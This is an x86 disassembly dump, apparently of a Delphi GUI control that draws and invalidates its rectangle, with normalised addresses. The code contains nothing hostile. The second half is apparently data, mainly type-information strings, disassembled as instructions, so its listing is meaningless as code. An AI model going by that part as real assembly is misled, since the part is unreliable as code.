mov edx 0x1
mov eax esi
call sub_3a9c788
mov [ esi + 0x264 ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_3aafd28
mov [ esi + 0x265 ] 0x1
mov dl 0x1
mov eax esi
call sub_3ab7f68
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9c3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab3d30
movzx eax [ ebx + 0x264 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x264 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_3a9c434
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab7220
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x1
jne r-xdata
mov eax ebx
call sub_3ab4518
sub_3a9c474
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a9c567
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x265 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3aafb88
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_3ab5f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9c56e
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
mov esi [ ebx + 0x260 ]
cmp [ ebx + 0x259 ] 0x0
je r-xdata
cmp [ ebx + 0x25a ] 0x0
je r-xdata
add esi [ ebx + 0x25c ]
test esi esi
jle r-xdata
add esi [ ebx + 0x25c ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call InvalidateRect
sub_3a9c578
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_3a9c5b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a9c72f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx eax [ ebx + 0x25a ]
test al al
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push ebp
call sub_3a9c578
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x25c ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x250 ]
call sub_3a9b558
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x260 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x250 ]
call sub_3a9b558
jmp r-xdata
test [ ebx + 0x52 ] 0x4
jne r-xdata
movzx eax [ ebx + 0x259 ]
test al al
je r-xdata
mov eax [ ebx + 0x260 ]
neg eax
push eax
mov edx [ ebx + 0x260 ]
neg edx
push eax
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov esi [ ebx + 0x250 ]
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push ebp
call sub_3a9c578
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x25c ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x250 ]
call sub_3a9b558
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_3a89b20
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a89f04
mov eax ebx
call sub_3ab9014
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_3a89c5c
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_3a8a25c
movzx eax [ ebx + 0x269 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x60
movzx eax [ ebx + 0x268 ]
or edi [ eax * 4 + rw-data ]
mov edx edi
mov eax ebx
call sub_3ab2548
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3aafb88
mov eax [ ebp - 0x1c ]
call sub_3a65730
push eax
mov eax esi
call sub_3a8a340
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9c736
lea eax [ ebp - 0x1c ]
call sub_3a652a0
retn
sub_3a9c7dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab2d60
mov eax [ ebx + 0x260 ]
neg eax
push eax
mov edx [ ebx + 0x260 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x25a ] 0x0
je r-xdata
cmp [ ebx + 0x259 ] 0x0
je r-xdata
add eax [ ebx + 0x25c ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x25c ]
sub_3a9c834
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab6818
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
xor edx edx
push ebp
push sub_3a9c956
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab6818
call sub_3a64ce0
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_3aaf2ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3aaf278
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_3a9c970
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab88c8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_3a9c99c
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x267 ] 0x1
mov edx ebx
mov eax esi
call sub_3ab901c
pop esi
pop ebx
retn
sub_3a9c9e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a9ca0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9ca14
retn
sub_3a9cb27
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
adc ch [ gs : edi + 0x66 ]
outsb
dec edi
jo r-xdata
push dx
popad
dec edi
outsb
insb
jns r-xdata
js r-xdata
je r-xdata
jne r-xdata
je r-xdata
imul ebp [ edi + 0x6e ] 0x1
add [ 0xffffffff88000000 ] dl

push cs
outsd
dec ax
imul esp [ ebp + 0x52 ] 0x4f646165
outsd
dec di
jbe r-xdata
jb r-xdata
cld
jne r-xdata
adc ch [ edi + 0x66 ]
dec esi
outsd
push edx
popad
dec edi
outsb
insb
jns r-xdata
outsd
adc ch [ edi + 0x66 ]
dec esi
je r-xdata
movq mm4 [ esi + 0x50 ]
outsd
or ch [ edi + 0x66 ]
push ebx
push 0x6548776f
insb
outsd
dec si
outsd
inc ebx
push 0x65676e61
inc esp
imul esi [ edx + 0xa ] 0x6853666f
outsd
ja r-xdata
jb r-xdata
jb r-xdata
popad
je r-xdata
je r-xdata
sbb [ edi + 0x7000603 ] cl
add edx [ eax ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
adc [ bx + 0x66 ] ebp
inc esi
imul ebp [ ebp + 0x43 ] 0x74616572
outsb
inc bp
js r-xdata
push ebx
insb
arpl [ gs : esp + edx + 0x6f ] si
jne r-xdata
dec ebp
jne r-xdata
dec esi
outsb
jae r-xdata
inc ecx
insb
insb
outsd
ja r-xdata
adc ch [ edi + 0x66 ]
outsd
dec si
outsd
push esi
popad
insb
imul esp [ ecx + 0x74 ] 0x666f1265
movq mm4 [ esi + 0x46 ]
jo r-xdata
insb
outsd
dec esi
je r-xdata
outsd
dec si
outsb
push ax
push eax
jb r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ esi + 0x3003 ] ah
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
fmul st2
test eax 0x540d0703
inc ebx
outsd
insd
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xca64676f
test eax 0xa78c1803
add eax [ esi ]
add [ edi ] al
add edi [ eax ]
add [ eax ] al
outsb
insb
jns r-xdata
popad
dec edi
cld
jne r-xdata
outsb
outsb
outsd
outsb
je r-xdata
outsb
popad
bound ebp [ ebp + 0x53 ]
jb r-xdata
arpl [ ebp + 0x4c ] sp
test eax 0x540d0303
push esp
outsd
inc esi
outsd
jb r-xdata
arpl [ ebp + 0x53 ] sp
je r-xdata
dec esi
je r-xdata
popad
je r-xdata
je r-xdata
outsd
outsb
inc esp
imul esp [ esi + 0x66 ] 0x6e657265
push ebx
je r-xdata
jae r-xdata
outsd
je r-xdata
insd
jo r-xdata
add al [ eax ]
add eax 0x336c7443
inc esp
nop
jne r-xdata
add [ eax + 0x1 ] al
outsb
push ebx
push 0xcb8c776f
test eax 0x540b0303
dec edi
jo r-xdata
add ebx [ eax ]
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax ] al
add [ esp + ebx ] bl
imul ebp [ edi + 0x6e ] 0xcb880573
test eax 0xcd389003
inc ebp
js r-xdata
jns r-xdata
jns r-xdata
test eax 0x1003
outsb
dec edi
jo r-xdata
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax ] ah
int 0xa9
add eax [ esi ]
outsd
jb r-xdata
outsd
inc si
outsd
jae r-xdata
push 0x6948776f
outsb
push ebx
push edx
arpl [ gs : ebp + 0x6e ] sp
je r-xdata
inc edx
add ecx [ esi ]
or edx [ edi + ecx * 2 + 0x46 ]
dec edi
jo r-xdata
outsb
popad
insd
jae r-xdata
outsb
or eax 0x6f4e666f
adc al 0x6f
outsd
outsd
push esp
jae r-xdata
dec si
js r-xdata
imul edi [ edx + 0x69 ] 0x6f11676e
inc sp
push ebx
adc [ edi + 0x66 ] ebp
jo r-xdata
dec si
outsd
inc esp
jb r-xdata
insb
inc esp
outsd
push cs
outsd
inc bx
jb r-xdata
imul ebp [ ebp + 0x4d ] 0x45747375
outsd
inc si
dec ebp
jne r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
insd
inc ebp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x6f0f03a9 ] dh
inc bp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xcd
test eax 0x666f0f03
inc ebp
inc esp
adc [ edi + 0x66 ] ebp
outsd
inc bp
insb
jne r-xdata
imul ebp [ edi + 0x6e ] 0x17845
pop es
int 0xa9
add eax [ esi ]
push cs
push esp
add [ eax ] al
add [ eax ] al
add [ esi - 0x29fc5632 ] dh
into
test eax 0xbc03
add [ eax ] bl
0x3a9
test eax 0xa9cee803
add eax [ eax ]
add [ eax ] al
jns r-xdata
or al 0x54
dec edi
dec esp
outsd
outsb
dec esi
dec esi
outsd
jae r-xdata
popad
je r-xdata
imul esp [ ecx + 0x6c ] 0x6f14676f
inc esp
je r-xdata
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
loopne r-xdata
add ebp esp
test eax 0xa9f2c803
add ebx [ eax + ebp * 8 - 0x57 ]
add edx [ ecx + ebp * 8 - 0x57 ]
add esp [ eax ]
call 0xffffffffffddd227
test eax 0xa9fb1803
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ esi + 0x6803 ] ah
add [ eax + edx + 0x7403a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x7803 ] ah
add [ eax + edx + 0x7c03a6 ] dl
add [ eax ] al
pop esp
test [ esi + 0x8003 ] ah
add [ 0xffffffffecffed00 ] al
test al 0x3
fadd [ ebp - 0x5a ]
add eax [ eax + ebp * 8 + 0x431803a9 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + esi * 8 - 0x57 ]
outsb
je r-xdata
add [ ebp - 0x324fffc0 ] cl
test eax 0x54110803
outsd
push eax
insb
popad
arpl [ ebp + 0x73 ] sp
inc edx
popad
jb r-xdata
cmp eax 0x45d403a8
dec ecx
je r-xdata
insb
jne r-xdata
outsb
dec edi
jo r-xdata
js r-xdata
dec di
insb
push eax
jb r-xdata
adc [ gs : edi + 0x66 ] ebp
js r-xdata
add dl [ edx ]
add ecx [ edi + 0x46 ]
dec esi
or edx [ edi + ecx * 2 + 0x46 ]
dec esi
outsd
je r-xdata
jo r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x7073676f
test eax 0xa7aad003
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x3a9cd ] cl
adc [ esi - 0x5631c3fd ] ah
add eax [ eax ]
add [ eax ] al
pop es
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 - 0x3117fc57 ] al
test eax 0x3
cmpsb [ esi ] [ edi ]
add edi [ esi + ecx * 8 ]
test eax 0x3
dec esi
outsd
je r-xdata
imul ebp [ edi + 0x6e ] 0x1784573
xor al 0xcd
test eax 0x408d03
mov ebp cs
test eax 0x540b0e03
dec edi
inc esi
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
push esp
add [ eax ] al
add [ ecx ] al
insd
jo r-xdata
add esi [ ebx + ebp * 4 - 0xb73fc59 ]
jns r-xdata
dec edi
jo r-xdata
dec edi
jo r-xdata
test eax 0x540e0603
imul ebp [ esi + 0x6b ] 0x666f1573
inc ebp
outsb
popad
bound ebp [ ebp + 0x49 ]
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
dec esi
outsd
je r-xdata
dec esp
push bx
push 0x41657261
ja r-xdata
or al 0x6f
test eax 0xa83df003
add edx esp
inc ebp
js r-xdata
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
pop es
sub_3a9cba4
test eax 0x666f0a03
push edx
popad
dec edi
outsb
insb
jns r-xdata
push cs
outsd
dec ax
imul esp [ ebp + 0x52 ] 0x4f646165
outsb
insb
jns r-xdata
outsd
dec di
jbe r-xdata
or ch [ edi + 0x66 ]
push ebx
push 0x6548776f
insb
outsd
dec si
outsd
inc ebx
push 0x65676e61
inc esp
imul esi [ edx + 0xa ] 0x6853666f
outsd
ja r-xdata
jb r-xdata
jb r-xdata
adc ch [ edi + 0x66 ]
inc ecx
insb
insb
outsd
ja r-xdata
outsd
dec si
outsd
push esi
popad
insb
imul esp [ ecx + 0x74 ] 0x666f1265
movq mm4 [ esi + 0x46 ]
jo r-xdata
insb
outsd
dec si
outsb
jb r-xdata
je r-xdata
jne r-xdata
push ebx
je r-xdata
jae r-xdata
inc esi
outsd
jb r-xdata
outsd
popad
je r-xdata
je r-xdata
adc ch [ edi + 0x66 ]
dec esi
outsd
push edx
popad
dec edi
outsb
insb
jns r-xdata
outsd
adc ch [ edi + 0x66 ]
dec esi
je r-xdata
jo r-xdata
insb
inc esp
dec si
outsd
inc esp
jb r-xdata
outsd
push cs
outsd
inc bx
jb r-xdata
outsd
jae r-xdata
push ebx
push edx
arpl [ gs : ebp + 0x6e ] sp
je r-xdata
inc edx
jne r-xdata
dec ebp
jne r-xdata
push ax
push eax
jb r-xdata
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
adc [ bx + 0x66 ] ebp
outsd
dec esi
je r-xdata
inc esi
imul ebp [ ebp + 0x43 ] 0x74616572
outsb
push ebx
insb
arpl [ gs : esp + edx + 0x6f ] si
inc bp
js r-xdata
add ecx [ esi ]
or edx [ edi + ecx * 2 + 0x46 ]
outsb
or al 0x54
dec edi
popad
je r-xdata
pop es
int 0xa9
add eax [ esi ]
push cs
push esp
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax ] ah
int 0xa9
add eax [ esi ]
outsd
jb r-xdata
outsd
inc si
push 0x6948776f
outsb
arpl [ ebp + 0x53 ] sp
je r-xdata
dec esi
je r-xdata
je r-xdata
insd
jo r-xdata
dec edi
jo r-xdata
outsb
outsb
outsd
outsb
je r-xdata
outsb
popad
bound ebp [ ebp + 0x53 ]
jb r-xdata
arpl [ ebp + 0x4c ] sp
test eax 0x540d0303
push esp
outsd
dec esi
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x29fc5632 ] dh
into
test eax 0xbc03
add [ eax ] bl
0x3a9
test eax 0xa9cee803
add eax [ eax ]
add [ eax ] al
jns r-xdata
add [ eax ] al
add [ esp + ebx ] bl
imul ebp [ edi + 0x6e ] 0xcb880573
test eax 0xcd389003
imul esp [ ecx + 0x6c ] 0x6f14676f
push eax
jb r-xdata
insb
jne r-xdata
outsb
dec edi
jo r-xdata
popad
insd
jae r-xdata
outsb
or eax 0x6f4e666f
adc al 0x6f
outsd
outsd
push esp
jae r-xdata
dec si
js r-xdata
imul ebp [ ebp + 0x4d ] 0x45747375
outsd
inc si
dec ebp
jne r-xdata
inc ebp
js r-xdata
jns r-xdata
jns r-xdata
test eax 0x1003
outsb
dec edi
jo r-xdata
popad
je r-xdata
je r-xdata
outsd
outsb
inc esp
imul esp [ esi + 0x66 ] 0x6e657265
js r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
insd
inc ebp
jbe r-xdata
insd
jo r-xdata
test eax 0xa7aad003
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x3a9cd ] cl
adc [ esi - 0x5631c3fd ] ah
add eax [ eax ]
add [ eax ] al
pop es
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 - 0x3117fc57 ] al
test eax 0x3
cmpsb [ esi ] [ edi ]
add edi [ esi + ecx * 8 ]
test eax 0x3
dec esi
outsd
je r-xdata
imul ebp [ edi + 0x6e ] 0x1784573
xor al 0xcd
test eax 0x408d03
mov ebp cs
test eax 0x540b0e03
dec edi
inc esi
dec esp
outsd
outsb
dec esi
dec esi
outsd
jae r-xdata
inc esp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x6f0f03a9 ] dh
inc bp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xcd
test eax 0x666f0f03
inc ebp
inc esp
adc [ edi + 0x66 ] ebp
outsd
inc bp
insb
jne r-xdata
imul ebp [ edi + 0x6e ] 0x17845
imul edi [ edx + 0x69 ] 0x6f11676e
inc sp
push ebx
adc [ edi + 0x66 ] ebp
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
push esp
add [ eax ] al
add [ ecx ] al
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
loopne r-xdata
add ebp esp
test eax 0xa9f2c803
add ebx [ eax + ebp * 8 - 0x57 ]
add edx [ ecx + ebp * 8 - 0x57 ]
add esp [ eax ]
call 0xffffffffffddd227
test eax 0xa9fb1803
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ esi + 0x6803 ] ah
add [ eax + edx + 0x7403a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x7803 ] ah
add [ eax + edx + 0x7c03a6 ] dl
add [ eax ] al
pop esp
test [ esi + 0x8003 ] ah
add [ 0xffffffffecffed00 ] al
test al 0x3
fadd [ ebp - 0x5a ]
add eax [ eax + ebp * 8 + 0x431803a9 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + esi * 8 - 0x57 ]
outsb
je r-xdata
imul ebp [ esi + 0x6b ] 0x666f1573
inc ebp
outsb
popad
bound ebp [ ebp + 0x49 ]
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
dec esi
outsd
je r-xdata
dec esp
push bx
push 0x41657261
ja r-xdata
or al 0x6f
dec di
insb
adc [ gs : edi + 0x66 ] ebp
js r-xdata
add [ ebp - 0x324fffc0 ] cl
test eax 0x54110803
outsd
push eax
insb
popad
arpl [ ebp + 0x73 ] sp
inc edx
popad
jb r-xdata
cmp eax 0x45d403a8
dec ecx
je r-xdata
add dl [ edx ]
add ecx [ edi + 0x46 ]
dec esi
or edx [ edi + ecx * 2 + 0x46 ]
dec esi
outsd
je r-xdata
jo r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x7073676f
add esi [ ebx + ebp * 4 - 0xb73fc59 ]
jns r-xdata
dec edi
jo r-xdata
dec edi
jo r-xdata
test eax 0x540e0603
test eax 0xa83df003
add edx esp
inc ebp
js r-xdata
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
pop es
sub_3a9d620
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh dl
test eax 0xa9d6b403
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c03a9d6 ] ah
add [ eax ] al
add [ esi + edi * 2 ] dh
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx eax
cld
test eax 0xa7abb403
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
dec ebp
popad
jae r-xdata
dec ecx
je r-xdata
add esp [ ecx + esi * 4 - 0x59 ]
add esp eax
mov cl 0xa7
add ecx [ esi ]
push esp
inc esi
imul ebp [ ebp + 0x54 ] 0x49657079
je r-xdata
insb
xlat
test eax 0x3
add [ ecx ] 0x0
insd
mov ah 0xd6
test eax 0x540d0703
inc esi
imul ebp [ ebp + 0x54 ] 0x49657079
je r-xdata
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add edx eax
stosb [ edi ]
insd
jae r-xdata
or [ esi + 0x69 ] al
insb
inc esp
imul esi [ ebx + 0x70 ] 0x4e79616c
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a9d7 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 + 0x1803a9 ] dl
add [ eax ] al
insd
push 0xc003a9d6
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
fsubr [ ecx + 0xc03 ]
add al al
adc [ esi - 0x59ba37fd ] ah
jb r-xdata
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
xlat
test eax 0x1803
add ah ch
test al 0xd7
test eax 0x540e0703
inc esi
imul ebp [ ebp + 0x54 ] 0x49657079
je r-xdata
cmpsd [ esi ] [ edi ]
add edx [ ebp + edi * 8 - 0x504bfc57 ]
cmpsd [ esi ] [ edi ]
add esp esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add ebx esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add edx [ eax + 0xe03a9fc ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0xc03a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x1403 ] ah
add [ 0x6c694654 ] cl
push esp
jns r-xdata
stosb [ edi ]
